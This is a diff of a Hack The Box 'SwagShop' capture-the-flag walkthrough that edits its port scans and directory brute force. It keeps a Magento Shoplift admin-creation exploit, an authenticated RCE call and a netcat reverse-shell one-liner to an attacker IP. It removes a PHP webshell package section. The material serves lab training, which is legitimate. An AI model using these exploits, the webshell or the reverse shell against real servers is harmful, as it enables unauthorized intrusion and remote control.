@@ -1,10 +1,7 @@
-Here’s a **clean, Markdown-formatted command walkthrough** for **HTB: SwagShop**, organized by phase and including explanatory context:
-
----
-
-# 🧢 HTB: SwagShop – Command Walkthrough
-
+# 🧢 HTB: SwagShop
+[Done](Done)
 ## 📌 Box Info
+- Platform [HTB](HTB)
 - **OS**: [Linux](Linux)
 - **Difficulty**: [Easy](Easy)
 - **Initial Access**: Magento authentication bypass + RCE
@@ -16,12 +13,12 @@ Here’s a **clean, Markdown-formatted command walkthrough** for **HTB: SwagShop
 
 ### 🔎 Full Port Scan
 ```bash
-nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.140
+nmap -sT -p- --min-rate 10000 -oA shagshop_basic 10.10.10.140
 ```
 
 ### 🔎 Script & Version Scan
 ```bash
-nmap -sC -sV -p 80,22 -oA scans/nmap-scripts 10.10.10.140
+nmap -sCV -p 80,22 -oA swagshop_scv 10.10.10.140
 ```
 
 ---
@@ -30,14 +27,14 @@ nmap -sC -sV -p 80,22 -oA scans/nmap-scripts 10.10.10.140
 
 ### 🔍 Directory Brute Force
 ```bash
-gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50 -o scans/gobuster-root -u http://10.10.10.140/
+gobuster dir -u http://10.10.10.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php
 ```
 
 ---
 
 ## 🐚 Shell as www-data
 
-### 👤 Add Admin via Shoplift Exploit
+### 👤 Add Admin via [Shoplift Exploit](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)
 ```bash
 python poc.py 10.10.10.140
 # Result: ypwq:123 added as admin
@@ -76,38 +73,12 @@ install_date = 'Wed, 08 May 2019 07:23:09 +0000'
 python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
 ```
 
-### 🧪 RCE #2 – Malicious Magento Package *(legacy method, may be patched)*
-
-#### 📦 Create Package
-```bash
-mkdir -p errors
-echo '<?php system($_REQUEST["cmd"]); ?>' > errors/cmd.php
-md5sum errors/cmd.php  # Save the hash
-
-# Create package.xml with correct structure and hash
-# Then:
-tar -czvf package.tgz errors/ package.xml
-```
-
-#### ⬆️ Upload Package
-Navigate to:
-```
-http://10.10.10.140/downloader/
-```
-
-#### 🕸️ Execute Command via Webshell
-```bash
-curl http://10.10.10.140/errors/cmd.php?cmd=id
-```
-
----
-
 ## ⚡ Get Reverse Shell
 
 ### 🧬 Reverse Shell Payload
 ```bash
-python magento_rce.py 'http://10.10.10.140/index.php/admin' \
-"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f"
+python magento_rce.py 'http://swagshop.htb/index.php/admin' \
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f"
 ```
 
 ### 📡 Catch Shell
